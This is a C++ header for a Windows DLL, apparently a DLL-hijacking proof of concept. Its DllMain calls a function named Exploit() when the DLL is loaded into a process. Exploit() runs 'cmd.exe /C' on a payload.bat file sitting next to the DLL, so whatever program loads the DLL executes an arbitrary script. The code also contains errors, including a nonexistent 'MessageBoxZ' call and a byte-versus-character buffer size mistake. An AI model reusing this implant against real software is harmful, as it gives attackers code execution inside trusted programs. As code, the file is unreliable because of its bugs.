#pragma once
// Insert all linker directives

#include <windows.h>
#include <string>
#include <atlstr.h>

void findWhoCalledMe()
{
	DWORD pid = GetCurrentProcessId();
	MessageBoxZ(NULL, std::to_string(pid).c_str(), "PID", MB_OK);
}

CStringW ThisDllDirPath()
{
	CStringW thisPath = L"";
	WCHAR path[MAX_PATH];
	HMODULE hm;
	if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPWSTR)&ThisDllDirPath, &hm))
	{
		GetModuleFileNameW(hm, path, sizeof(path));
		PathRemoveFileSpecW(path);
		thisPath = CStringW(path);
		if (!thisPath.IsEmpty() &&
			thisPath.GetAt(thisPath.GetLength() - 1) != '\\')
			thisPath += L"\\";
	}
	return thisPath;
}

int Exploit()
{
	// Create the command line 
	std::wstring fullpath(TEXT("cmd.exe /C \""));
	fullpath += ThisDllDirPath();
	fullpath += std::wstring(TEXT("payload.bat\""));
	TCHAR * fullpathwc = (wchar_t *)fullpath.c_str();

	// Start a new process using the command line 
	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	CreateProcess(NULL, fullpathwc, NULL, NULL, TRUE, CREATE_DEFAULT_ERROR_MODE, NULL, NULL, &info, &processInfo);

	return 0;
}

BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
	switch (dwReason)
	{
		case DLL_PROCESS_ATTACH:
			MessageBox(NULL, "Attaching", "Add", MB_ICONERROR | MB_OK);
			Exploit();
			break;
		case DLL_THREAD_ATTACH:
			findWhoCalledMe();
			break;
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}